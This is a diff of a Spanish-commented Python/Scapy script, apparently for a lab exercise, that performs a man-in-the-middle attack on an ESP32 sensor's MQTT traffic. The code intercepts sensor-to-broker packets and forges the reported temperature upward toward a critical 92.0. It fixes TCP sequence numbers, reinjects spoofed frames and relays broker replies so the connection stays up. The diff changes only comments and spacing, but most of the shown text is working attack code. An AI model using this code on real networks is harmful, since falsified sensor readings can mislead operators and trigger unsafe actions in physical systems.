@@ -165,9 +165,9 @@ from datetime import datetime
 # CONFIGURACIÓN (ajustar según tu red de laboratorio)
 # ====================================================
 IFACE       = "wlp3s0"                  # interfaz Wi-Fi del atacante
-MY_IP       = "XXX.XXX.XXX.XXX"           # IP de tu máquina (broker local)
+MY_IP       = "XXX.XXX.XXX.XXX"         # IP de tu máquina (broker local)
 MY_MAC      = get_if_hwaddr(IFACE)      # se obtiene automáticamente
-ESP32_IP    = "XXX.XXX.XXX.XXX"           # IP del sensor ESP32
+ESP32_IP    = "XXX.XXX.XXX.XXX"         # IP del sensor ESP32
 ESP32_MAC   = "XX:XX:XX:XX:XX:XX"       # MAC del ESP32
 TARGET_TEMP = 92.0                      # valor crítico objetivo
 # ====================================================
@@ -203,7 +203,9 @@ def mitm(pkt):
         return
     payload = pkt[Raw].load
 
-    # Paquetes del sensor → broker
+    # ------------------------------------------------
+    # Paquetes del sensor → broker (los que modificamos)
+    # ------------------------------------------------
     if (pkt.haslayer(IP) and pkt[IP].src == ESP32_IP and
         pkt.haslayer(TCP) and pkt[TCP].dport == 1883 and
         b'"temp"' in payload):
@@ -212,29 +214,31 @@ def mitm(pkt):
             txt = payload.decode()
             real_temp = float(txt.split('"temp":')[1].split(',')[0])
 
-            # escalada progresiva
+            # escalada progresiva controlada
             current_temp += round(random.uniform(2.1, 4.3), 1)
             if current_temp > TARGET_TEMP:
                 current_temp = TARGET_TEMP
                 peak_reached = True
             forged_temp = round(current_temp, 1)
 
+            # reemplazo del valor real por el falso
             forged_txt = txt.replace(f'"temp":{real_temp}', f'"temp":{forged_temp}', 1)
             forged_payload = forged_txt.encode()
 
-            # truco Wi-Fi (dst = propia MAC)
+            # truco Wi-Fi: usar nuestra propia MAC como destino
             spoofed = (Ether(src=MY_MAC, dst=MY_MAC) /
                        IP(src=ESP32_IP, dst=MY_IP) /
                        pkt[TCP] /
                        Raw(forged_payload))
 
+            # ajuste de secuencia TCP si cambia la longitud del payload
             delta = len(forged_payload) - len(payload)
             if delta:
                 spoofed[TCP].seq += delta
 
             sendp(spoofed, iface=IFACE, verbose=0)
 
-            # actualización de pantalla
+            # actualización de pantalla cada ~0.9 s o al alcanzar el objetivo
             if time.time() - last_update > 0.9 or peak_reached:
                 print_header()
                 print(f"  \033[96mTarget Device\033[0m : {ESP32_IP} ({ESP32_MAC})")
@@ -262,7 +266,9 @@ def mitm(pkt):
         except:
             pass
 
-    # Reenvío broker → sensor (mantiene la conexión viva)
+    # ------------------------------------------------
+    # Reenvío de respuestas del broker al sensor
+    # ------------------------------------------------
     elif pkt.haslayer(IP) and pkt[IP].dst == ESP32_IP and pkt[TCP].sport == 1883:
         sendp(Ether(src=MY_MAC, dst=MY_MAC) / pkt[IP], iface=IFACE, verbose=0)
 
